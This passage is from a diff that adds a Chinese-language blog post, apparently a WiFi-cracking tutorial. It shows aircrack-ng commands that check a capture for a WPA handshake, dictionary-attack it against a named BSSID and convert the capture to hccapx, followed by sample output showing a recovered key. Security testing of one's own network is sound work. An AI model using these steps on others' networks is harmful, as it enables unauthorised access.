+<p>4.8 将 aircrack-ng 路径添加到 /etc/paths 中。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo vim /etc/paths</span><br></pre></td></tr></table></figure>
+<p>然后将 aircrack-ng 路径添加到最后一行。</p>
+<p>4.9 查看抓到的包中是否包含握手包。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#$ aircrack-ng capture.cap</span></span><br><span class="line">Hu-YupingdeMacBook-Pro:wifi kris$ aircrack-ng capture.cap</span><br><span class="line">Opening capture.capease <span class="built_in">wait</span>...</span><br><span class="line">Read 4 packets.</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  BSSID              ESSID                     Encryption</span></span><br><span class="line"></span><br><span class="line">   1  74:7D:24:D7:AF:DC  @PHICOMM_DA               WPA (0 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as target.</span><br><span class="line"></span><br><span class="line">Opening capture.capease <span class="built_in">wait</span>...</span><br><span class="line">Read 4 packets.</span><br><span class="line"></span><br><span class="line">1 potential targets</span><br><span class="line"></span><br><span class="line">Please specify a dictionary (option -w).</span><br></pre></td></tr></table></figure>
+<ol start="5">
+<li><p>撞击密码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ aircrack-ng -w alphaDic.txt -b 98:13:33:B4:35:A4 capture1.cap</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>转换包格式,如果使用上面的cap无法爆破，或者爆破比较麻烦，可以将cap包转换成hcccapx格式，然后再破解。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./cap2hccapx.bin /Users/kris/Desktop/wifi/20200208/capture.cap /Users/kris/Desktop/wifi/20200208/capture.hccapx</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ol>
+<p>下面是一个破解示例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Aircrack-ng 1.5.2 </span><br><span class="line"></span><br><span class="line">      [00:03:20] 2018576/13516904 keys tested (10197.95 k/s) </span><br><span class="line"></span><br><span class="line">      Time left: 18 minutes, 47 seconds                         14.93%</span><br><span class="line"></span><br><span class="line">                          KEY FOUND! [ 19731009qiu ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Master Key     : A8 36 07 C4 68 42 71 E0 B9 38 6E 16 B7 1B 7A 77 </span><br><span class="line">                       DA 07 E9 A1 82 CE 95 56 22 C2 76 16 93 B1 8E 9B </span><br><span class="line"></span><br><span class="line">      Transient Key  : 34 83 20 8E B0 2E F2 11 FF 5B 68 A4 A3 16 94 FE </span><br><span class="line">                       74 28 4D D9 99 BA 10 38 F4 20 6D 14 D1 47 89 C9 </span><br><span class="line">                       22 75 EB B5 29 FD CF 9B 01 32 38 B7 51 10 94 88 </span><br><span class="line">                       90 4D 52 D5 88 E4 B1 58 DA 2D DC 35 5F 61 88 92 </span><br><span class="line"></span><br><span class="line">      EAPOL HMAC     : F6 4D 5F 02 77 F9 96 8A F4 E3 C7 8C DA E4 C6 E0 </span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>通用</category>
+      </categories>
+      <tags>
+        <tag>通用</tag>
       </tags>
   </entry>
   <entry>
